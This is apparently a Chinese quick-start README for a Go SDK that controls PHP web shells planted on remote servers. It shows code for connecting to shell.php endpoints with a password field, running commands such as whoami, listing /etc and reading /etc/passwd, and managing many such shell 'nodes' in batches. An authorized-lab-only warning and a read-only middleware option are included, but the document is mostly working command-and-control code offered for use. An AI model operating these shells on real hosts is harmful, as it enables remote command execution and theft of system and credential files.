# 快速开始

> ⚠️ **安全提示**：本 SDK 仅用于已获得书面授权的靶场 / 自有环境。请勿对未经授权的目标使用。

## 1. 安装

```bash
go get github.com/yliken/redbeanshellcore
```

要求 Go 1.21+。

## 2. 一分钟跑起来

```go
package main

import (
    "context"
    "fmt"
    "time"

    "github.com/yliken/redbeanshellcore/core"
    phpshell "github.com/yliken/redbeanshellcore/adapter/php"
    "github.com/yliken/redbeanshellcore/transport/httpform"
)

func main() {
    ctx := context.Background()

    // 构造传输层
    tr := httpform.New("https://lab.example/shell.php")
    tr.Timeout = 30 * time.Second

    // 构造 client
    client := core.NewClient(
        core.WithSession(&core.Session{
            NodeID:    "lab-01",
            Endpoint:  "https://lab.example/shell.php",
            Adapter:   "php",
            Metadata:  map[string]string{"auth_password_field": "antpwd"},
        }),
        core.WithTransport(tr),
    )

    // 获取系统信息
    res, _ := client.Do(ctx, phpshell.NewPhpInfo())
    info := res.(*core.InfoResult)
    fmt.Printf("workdir=%s\nos=%s\nuser=%s\n", info.Workdir, info.OS, info.User)
}
```

输出：

```
workdir=/var/www/html
os=Linux lab01 5.4.0-generic x86_64
user=www-data
```

## 3. 执行命令

```go
res, _ := client.Do(ctx, phpshell.NewPhpExec("whoami"))
er := res.(*core.ExecResult)
fmt.Println(er.Stdout)
```

## 4. 文件操作

```go
// 列目录
res, _ := client.Do(ctx, phpshell.NewPhpFileList("/etc"))
flr := res.(*core.FileListResult)
for _, e := range flr.Entries {
    fmt.Printf("%s\n", e.Name)
}

// 读文件
res, _ := client.Do(ctx, phpshell.NewPhpFileRead("/etc/passwd"))
frr := res.(*core.FileReadResult)
fmt.Println(string(frr.Data))
```

## 5. 多节点管理

```go
mgr := core.NewManager(memory.New(), phpadapter.NewClientFactory())

// 注册节点
mgr.Register(ctx, core.NodeConfig{
    ID: "lab-a", Endpoint: "https://lab-a.example/shell.php",
    Adapter: "php", Transport: "httpform",
    Auth:  map[string]string{"param": "antpwd"},
    Tags:  []string{"lab"}, Group: "case-001",
})

// 获取 client
cli, _ := mgr.Client(ctx, "lab-a")

// 批量操作
nodes, _ := mgr.List(ctx, core.NodeFilter{Group: "case-001"})
for _, n := range nodes {
    c, _ := mgr.Client(ctx, n.Config.ID)
    c.Do(ctx, phpshell.NewPhpInfo())
}
```

## 6. 环境变量预注册节点

```bash
export NODES="lab-a=http://example.com/shell.php;cmd,lab-b=http://example2.com/shell.php;cmd"
go run main.go
```

格式：`id1=url1;field1,id2=url2;field2`

## 7. 中间件

```go
client := core.NewClient(
    core.WithSession(sess),
    core.WithTransport(tr),
    core.WithMiddleware(
        logging.Middleware(),     // 请求日志
        audit.Middleware(),       // 审计事件
        timeout.Middleware(timeout.Options{Timeout: 30 * time.Second}),
        retry.Middleware(retry.Options{MaxAttempts: 3}),
        readonly.Middleware(),    // 拦截写操作
    ),
)
```

## 常见问题

| 问题 | 原因 | 解决 |
|------|------|------|
| `workdir= os= user=` 全空 | 用了 `ops.NewInfo()` | 换成 `phpshell.NewPhpInfo()` |
| `sh: 1: -c: not found` | bin 路径为空 | 用 `phpshell.NewPhpExec(cmd)` |
| `transport 未配置` | endpoint 为空 | 检查 NodeConfig.Endpoint |
| `ErrPolicyDenied` | readonly 拦截 | 正常行为，写操作被阻止 |
